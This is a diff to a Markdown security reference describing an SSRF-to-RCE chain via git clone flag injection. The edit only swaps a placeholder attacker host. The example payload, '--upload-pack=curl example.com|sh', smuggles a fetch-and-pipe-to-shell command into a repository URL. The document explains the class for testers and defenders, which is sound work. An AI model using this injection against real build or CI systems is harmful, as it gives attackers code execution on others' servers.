@@ -20,7 +20,7 @@ SSRF earns its place at the top of the impact ladder because every modern applic
 
 ### Snyk SSRF → Git config injection → RCE chain
 - **Source:** Snyk Security Research blog, multiple posts in 2022-2024 covering the chain from a fetch-arbitrary-URL primitive to a remote-code-execution outcome via clones to attacker-controlled git URLs containing `--upload-pack=` or `--config=` flag-injection-via-URL. Search by topic — the class is publicly documented across Snyk write-ups and corresponding CVEs.
-- **Pattern shape:** A CI/CD or build-system endpoint accepts a "repository URL" parameter. The backend invokes `git clone <url>`. A specially crafted URL (e.g. `--upload-pack=curl example.com|sh https://attacker.com/repo.git`) causes `git` to interpret the leading dashes as command-line flags, reaching command execution as the build user.
+- **Pattern shape:** A CI/CD or build-system endpoint accepts a "repository URL" parameter. The backend invokes `git clone <url>`. A specially crafted URL (e.g. `--upload-pack=curl example.com|sh https://attacker.example/repo.git`) causes `git` to interpret the leading dashes as command-line flags, reaching command execution as the build user.
 - **Key trick:** This is SSRF in input *shape* — fetch-from-URL — but the protocol is `git`, not HTTP, and the dangerous primitive is git's own flag parsing, not the network fetch. Operators who only test HTTP-shaped SSRF miss this entirely.
 - **Why it matters:** "SSRF" is shorthand for "server-initiated request influenced by attacker input." When the request tool is `git`, `curl`, `wget`, `ffmpeg`, `convert`, or `wkhtmltopdf`, the impact often exceeds plain network fetch — it reaches tool-specific code execution.
 
